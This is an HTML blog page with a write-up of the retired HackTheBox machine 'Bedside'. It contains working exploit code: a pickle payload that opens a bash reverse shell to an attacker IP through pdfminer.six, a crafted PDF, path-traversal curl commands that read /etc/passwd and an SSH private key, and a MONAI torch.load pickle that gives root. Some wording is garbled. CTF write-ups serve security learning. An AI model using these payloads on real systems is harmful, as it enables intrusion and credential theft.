@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Bedside | Youssef Ashraf</title>
+<meta name="description" content="so we have an http server at beside.htb so going there so looking around the main site is basically useless, so i tried searching for sub-directories, but nothing was found. So looks like th...">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@400;600;700&family=Zen+Old+Mincho&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../../css/style.css">
+</head>
+<body>
+<div class="bg-orb o1" aria-hidden="true"></div>
+<div class="bg-orb o2" aria-hidden="true"></div>
+
+<div class="wrap">
+  <a class="back" href="../../writeups.html">&larr; All write-ups</a>
+  <header class="post-head">
+    <p class="eyebrow">HackTheBox &bull; Retired</p>
+    <h1>Bedside</h1>
+    <p class="meta"><span>Nov 2026</span><span class="pill">HackTheBox</span></p>
+  </header>
+  <article>
+<p>as always we do a nmap scan</p>
+<pre><code class="language-shell">nmap -sVC -p- -vv -oN nmapScan -T3 10.129.89.101
+</code></pre>
+<pre><code class="language-txt">PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.68
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.68 (Debian)
+|_http-title: Did not follow redirect to http://bedside.htb/
+Service Info: Host: default; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p>so we have an http server at <code>beside.htb</code> so going there
+<img alt="" src="images/bedside/img01.png" />
+so looking around the main site is basically useless, so i tried searching for sub-directories, but nothing was found. So looks like the main website is useless. so searching for vhosts, we find a <code>research.bedside.htb</code> using <code>gobuster</code> like so</p>
+<pre><code class="language-shell">gobuster vhost -u http://bedside.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 200 -k -q --append-domain --xs 301
+
+
+research.bedside.htb Status: 200 [Size: 3152]
+</code></pre>
+<p>So with that adding it to our <code>/etc/hosts</code> file and browsing it we find
+<img alt="" src="images/bedside/img02.png" />
+so looks like we are looking at a file upload vulnerability, and from the directory search we notice that most of the files were ending <code>.php</code> so it looks like we are looking at a php website aswell</p>
+<p>so at first when i uploaded something that isn't in the valid extensions i get this
+<img alt="" src="images/bedside/img03.png" />
+and when i tried to do a double extension
+<img alt="" src="images/bedside/img04.png" /></p>
+<p>so intercepting the request on burp and trying some stuff i notice that one of the headers for the file upload is <code>pdfminer.six</code>
+<img alt="" src="images/bedside/img05.png" />
+<img alt="" src="images/bedside/img06.png" />
+so it looks like the vulnerability lies in sending a malicious pdf such that the engine pdfminer.six extracts it and then executes code, so I went to search for CVES related to <code>pdfminer.six</code> and found its vulnerable to <code>CVE-2025-64512</code>
+<img alt="" src="images/bedside/img07.png" />
+so upon this <a href="https://github.com/advisories/GHSA-wf5f-4jwr-ppcp">PoC advisory</a> , we first need to create a .py file </p>
+<pre><code class="language-shell">#!/usr/bin/env python3
+import pickle
+import gzip
+
+def create_demo_pickle():
+    print(&quot;Creating demonstration pickle file...&quot;)
+
+    # Create payload that executes code AND returns a dict (as pdfminer expects)
+    class EvilPayload:
+        def __reduce__(self):
+            # This function will be called during unpickling
+            code = &quot;print('Malicious code executed.') or exit(0) or {}&quot;
+            return (eval, (code,))
+
+    demo_cmap_data = EvilPayload()
+
+    # Create the pickle file that the path traversal would access
+    target_path = &quot;./malicious.pickle.gz&quot;
+
+    try:
+        with gzip.open(target_path, 'wb') as f:
+            pickle.dump(demo_cmap_data, f)
+        print(f&quot;✓ Created demonstration pickle file: {target_path}&quot;)
+        return target_path
+
+    except Exception as e:
+        print(f&quot;✗ Error creating pickle file: {e}&quot;)
+        return None
+
+if __name__ == &quot;__main__&quot;:
+    create_demo_pickle()
+</code></pre>
+<p>but change <code>code="bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/&lt;PORT&gt; 0&gt;&amp;1'"</code> </p>
+<pre><code class="language-shell">#!/usr/bin/env python3
+import pickle
+import gzip
+
+def create_demo_pickle():
+    print(&quot;Creating demonstration pickle file...&quot;)
+
+    # Create payload that executes code AND returns a dict (as pdfminer expects)
+    class EvilPayload:
+        def __reduce__(self):
+            # This function will be called during unpickling
+            code = &quot;bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.102/5555 0&gt;&amp;1'&quot;
+            return (eval, (code,))
+
+    demo_cmap_data = EvilPayload()
+
+    # Create the pickle file that the path traversal would access
+    target_path = &quot;./malicious.pickle.gz&quot;
+
+    try:
+        with gzip.open(target_path, 'wb') as f:
+            pickle.dump(demo_cmap_data, f)
+        print(f&quot;✓ Created demonstration pickle file: {target_path}&quot;)
+        return target_path
+
+    except Exception as e:
+        print(f&quot;✗ Error creating pickle file: {e}&quot;)
+        return None
+
+if __name__ == &quot;__main__&quot;:
+    create_demo_pickle()
+</code></pre>
+<p>and then run it to create the malicious pickle file
+<img alt="" src="images/bedside/img08.png" />
+and then from there create the malicious pdf </p>
+<pre><code class="language-pdf">%PDF-1.4
+1 0 obj
+&lt;&lt;
+/Type /Catalog
+/Pages 2 0 R
+&gt;&gt;
+endobj
+
+2 0 obj
+&lt;&lt;
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+&gt;&gt;
+endobj
+
+3 0 obj
+&lt;&lt;
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Contents 4 0 R
+/Resources
+&lt;&lt;
+/Font
+&lt;&lt;
+/F1 5 0 R
+&gt;&gt;
+&gt;&gt;
+&gt;&gt;
+endobj
+
+4 0 obj
+&lt;&lt;
+/Length 44
+&gt;&gt;
+stream
+BT
+/F1 12 Tf
+100 700 Td
+(Malicious PDF) Tj
+ET
+endstream
+endobj
+
+5 0 obj
+&lt;&lt;
+/Type /Font
+/Subtype /Type0
+/BaseFont /MaliciousFont-Identity-H
+/Encoding /#2Fvar#2Fwww#2Fresearch.bedside.htb#2Fuploads#2Fmalicious.pickle.gz
+/DescendantFonts [6 0 R]
+&gt;&gt;
+endobj
+
+6 0 obj
+&lt;&lt;
+/Type /Font
+/Subtype /CIDFontType2
+/BaseFont /MaliciousFont
+/CIDSystemInfo
+&lt;&lt;
+/Registry (Adobe)
+/Ordering (Identity)
+/Supplement 0
+&gt;&gt;
+/FontDescriptor 7 0 R
+&gt;&gt;
+endobj
+
+7 0 obj
+&lt;&lt;
+/Type /FontDescriptor
+/FontName /MaliciousFont
+/Flags 4
+/FontBBox [-1000 -1000 1000 1000]
+/ItalicAngle 0
+/Ascent 1000
+/Descent -200
+/CapHeight 800
+/StemV 80
+&gt;&gt;
+endobj
+
+xref
+0 8
+0000000000 65535 f
+0000000009 00000 n
+0000000058 00000 n
+0000000115 00000 n
+0000000274 00000 n
+0000000370 00000 n
+0000000503 00000 n
+0000000673 00000 n
+trailer
+&lt;&lt;
+/Size 8
+/Root 1 0 R
+&gt;&gt;
+startxref
+871
+%%EOF
+</code></pre>
+<p>and then upload the <code>malicious.pickle</code> file , and then <code>malicious.pdf</code> 
+<img alt="" src="images/bedside/img09.png" /></p>
+<p><img alt="" src="images/bedside/img10.png" />
+so after gaining the shell
+<img alt="" src="images/bedside/img11.png" />
+we land in the <code>/app</code> directory, so going around we find a bash script in <code>/tmp</code> called portscan, and we notice that we are in a docker container
+<img alt="" src="images/bedside/img12.png" />
+<img alt="" src="images/bedside/img13.png" />
+so this gives us a way to enumerate the ports if they are listneing on the local service, so first make it into an executable and use it against the local service
+<img alt="" src="images/bedside/img14.png" />
+so we do get a port open at 3000, note that we couldn't use <code>ss -ltunp</code> as it gives out an error. so lets try to curl to that port and see what it is running
+<img alt="" src="images/bedside/img15.png" />
+it looks like its running an image viewer, but at the end of the curl request we find this
+<img alt="" src="images/bedside/img16.png" />
+so i went to search on google on <code>built with esm.sh CVE</code> and found that its vulnerable to and found through this <a href="https://github.com/esm-dev/esm.sh/security/advisories/GHSA-49pv-gwxp-532r">advisory</a> we can utilize a LFI through it to read files , the POC listed was:</p>
+<pre><code class="language-shell">curl --path-as-is 'http://localhost:9999/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&amp;module=1'
+</code></pre>
+<p>so we just fix this a bit like so</p>
+<pre><code class="language-shell">curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../../../../etc/passwd?raw=1&amp;module=1'
+</code></pre>
+<p><img alt="" src="images/bedside/img17.png" />
+now what we have file read, one of the most important thing is checking the <code>/etc/passwd</code> to see who has a login shell and who we can't log in with, so we notice the user <code>developer</code> has a <code>/bin/bash</code> so we could use this to read his private ssh key and use it to log in, like so</p>
+<pre><code class="language-shell">curl --path-as-is 'http://localhost:3000/pr/x/y@99/../../../../../../../../../../home/developer/.ssh/id_rsa?raw=1&amp;module=1'
+</code></pre>
+<p><img alt="" src="images/bedside/img18.png" />
+so now with that we could use this SSH key to log in as <code>developer</code> 
+<img alt="" src="images/bedside/img19.png" />
+and the user.txt is found there, so now looking  at the listening ports we do not find something interesting, but we try <code>sudo -l</code> and we do find we can run a python script as sudo
+<img alt="" src="images/bedside/img20.png" />
+so i first transferred this script to my box using <code>scp</code></p>
+<pre><code class="language-shell">scp -i developer_id_rsa developer@10.129.89.101:/opt/trainer/bedside_trainer.py .
+</code></pre>
+<p>bedside_trainer.py is a MONAI training harness. The dangerous part is the checkpoint resume block:
+on line 209</p>
+<pre><code class="language-python">latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
+start_epoch = 0
+if latest_ckpt:
+    logger.info(f&quot;Found checkpoint {latest_ckpt}, loading with CheckpointLoader (callable mode)...&quot;)
+    loader = CheckpointLoader(                       # line 213
+        load_path=str(latest_ckpt),
+        load_dict={&quot;model&quot;: model, &quot;optimizer&quot;: optimizer},
+        map_location=DEVICE
+    )
+    class MockEngine:                                # line 220
+        def __init__(self):
+            self.state = type(&quot;State&quot;, (), {})()
+            self.state.max_epochs = None
+            self.state.epoch = 0
+    engine = MockEngine()
+    loader(engine)                                   # line 227  &lt;- sink
+</code></pre>
+<p>find_latest_checkpoint is attacker-controllable selection:</p>
+<p>on lines 94-96</p>
+<pre><code class="language-python">def find_latest_checkpoint(checkpoint_dir: Path):
+    ckpts = sorted(checkpoint_dir.glob(&quot;*.pt&quot;), key=os.path.getmtime)
+    return ckpts[-1] if ckpts else None
+</code></pre>
+<p>It takes the newest *.pt in /datastore/checkpoints by mtime and feeds it to CheckpointLoader. Two things make this exploitable:
+1. /datastore is attacker-writable. The container I already owned (data-wrangler) bind-mounts the host's /dev/sda4 at /datastore, and /datastore is owned by datawrangler:dataops. So I can drop any file into /datastore/checkpoints/ and it is visible to the host root process.
+2. CheckpointLoader(...).<strong>call</strong> deserializes that file with torch.load.
+3. How I identified the CVE
+The combination of signals was unambiguous:
+- The import on line 46 has a tell-tale author comment: from monai.handlers import CheckpointLoader  # &lt;-- Correct import.
+- The MockEngine + CheckpointLoader(load<strong>ath=</strong>., load<strong>ict=..</strong> map<strong>ocat</strong>n=...) + loader(engine) block is verbatim the proof-of-concept from the MONAI advisory.
+That advisory is CVE-2025-58756 / GHSA-6vm5-6jv9-rjpj — "Unsafe torch usage leads to arbitrary code execution":
+- Package: monai
+- Affected: ≤ 1.5.0
+- Patched: 1.5.1 (PR #8566, which forces weights_only=True)
+CheckpointLoader.<strong>call</strong> in the vulnerable versions calls:
+checkpoint = torch.load(self.load_path, map_location=self.map_location, weights_only=False)
+torch.load with weights_only=False uses the standard Python pickle unpickler under the hood. Pickle is not a data format — it is a bytecode interpreter. During unpickling it can import arbitrary modules and call arbitrary functions via an object's <strong>reduce</strong>. So loading a checkpoint file I control = executing my code, in this case as root.
+This was confirmed live, not just assumed: the first trainer run's traceback printed
+monai/handlers/checkpoint_loader.py", line 146, in <strong>call</strong>
+    Checkpoint.load_objects(...)
+after torch.load had already returned — and an earlier traceback showed the literal call torch.load(self.load_path, map_location=self.map_location, weights_only=False). The box ships a vulnerable MONAI.</p>
+<p>torch.save/torch.load format is a ZIP archive. torch.load reads the data.pkl entry and unpickles it:</p>
+<pre><code class="language-txt">archive/data.pkl     &lt;- the pickle (executes on load)
+archive/byteorder    &lt;- b&quot;little&quot;
+archive/version      &lt;- b&quot;3&quot;
+</code></pre>
+<p>(First attempt I wrote data.pkl at the zip root; torch rejected it with file in archive is not in a subdirectory — the entries must live under archive/.)
+The malicious data.pkl is a pickled object whose <strong>reduce</strong> returns a callable to run during unpickling:</p>
+<pre><code class="language-python">class Evil:
+    def __reduce__(self):
+        return (eval, (&quot;(__import__('os').system(CMD), {})[1]&quot;,))
+- pickle.loads calls eval(code) → os.system(CMD) runs as root.
+- The (..., {})[1] makes the result {}, so the top-level object is a plain dict — the load itself succeeds and only the later Checkpoint.load_objects state-dict matching fails (harmlessly, after my code has run).
+</code></pre>
+<p>This is exactly why the final traceback (the Key 'model' ... dict_keys([]) error) is expected and irrelevant: it is thrown at line 146 of checkpoint_loader.py, after the pickle already executed.</p>
+<p>build_model(dataloader) (which calls next(iter(dataloader))) and the checkpoint-load block are only reached when there is at least one data sample. So I planted a valid image:
+- /datastore/processed/pwn.png
+This is important because /datastore/staging already held 860 .txt files (the output of the pdf extraction pipeline). If processed/ were empty, the script would promote up to 200 of those .txt files into processed/, and MONAI's LoadImaged would try to open them as images and crash before the checkpoint load. Pre-seeding processed/ with a real image makes n_data &gt; 0 on the first call, so the promote path is skipped.</p>
+<p>So the exploit sequence looks like so:</p>
+<p>Plant the trigger files from the container (datawrangler):
+- /datastore/processed/pwn.png — valid 64×64 PNG (satisfies the data gate)
+- /datastore/checkpoints/evil.pt — malicious checkpoint, newest mtime</p>
+<p>Run the trainer as developer:</p>
+<pre><code>sudo /usr/bin/python3 /opt/trainer/bedside_trainer.py
+</code></pre>
+<p>find_latest_checkpoint picks evil.pt → CheckpointLoader → torch.load(weights_only=False) → unpickle → os.system(CMD) as root.</p>
+<p>now with that once we execute the python script again, we should find a <code>/tmp/rootbash</code> set to our home directory which can be used to escalate to root since its a SUID bash from root with permissions for users <code>655</code> to execute
+<img alt="" src="images/bedside/img21.png" />
+and thats it, ngl the priv Esc i needed to use Ai , too much source code and Ai ohio review</p>
+<p>anyways happy hacking ladies and gents</p>
+  </article>
+  <div class="article-footer">Written by Youssef Ashraf. Published for a retired HTB machine, in line with HTB's write-up policy.</div>
+</div>
+
+<script src="../../js/main.js"></script>
+</body>
+</html>
